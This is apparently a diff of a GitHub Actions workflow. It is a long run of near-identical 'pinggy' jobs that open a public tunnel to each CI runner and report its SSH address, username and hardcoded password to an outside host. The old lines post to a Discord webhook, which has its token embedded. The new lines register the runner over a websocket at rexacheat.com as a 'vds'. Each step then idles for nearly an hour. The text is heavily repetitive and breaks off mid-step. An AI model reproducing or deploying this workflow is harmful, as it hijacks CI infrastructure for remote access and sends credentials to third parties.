-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
 
   pinggy-14:
@@ -2110,7 +2929,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 2
         run: |
@@ -2132,7 +2960,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 3
         run: |
@@ -2154,7 +2991,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 4
         run: |
@@ -2176,7 +3022,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 5
         run: |
@@ -2198,7 +3053,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 6
         run: |
@@ -2220,7 +3084,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 7
         run: |
@@ -2242,7 +3115,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
 
   pinggy-15:
@@ -2270,7 +3152,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 2
         run: |
@@ -2292,7 +3183,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 3
         run: |
@@ -2314,7 +3214,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 4
         run: |
@@ -2336,7 +3245,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 5
         run: |
@@ -2358,7 +3276,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 6
         run: |
@@ -2380,7 +3307,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 7
         run: |
@@ -2402,7 +3338,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
 
   pinggy-16:
@@ -2430,7 +3375,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 2
         run: |
@@ -2452,7 +3406,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 3
         run: |
@@ -2474,7 +3437,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 4
         run: |
@@ -2496,7 +3468,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 5
         run: |
@@ -2518,7 +3499,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 6
         run: |
@@ -2540,7 +3530,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 7
         run: |
@@ -2562,7 +3561,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
 
   pinggy-17:
@@ -2590,7 +3598,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 2
         run: |
@@ -2612,7 +3629,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 3
         run: |
@@ -2634,7 +3660,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 4
         run: |
@@ -2656,7 +3691,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 5
         run: |
@@ -2678,7 +3722,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 6
         run: |
@@ -2700,7 +3753,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 7
         run: |
@@ -2722,7 +3784,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
 
   pinggy-18:
@@ -2750,7 +3821,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 2
         run: |
@@ -2772,7 +3852,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
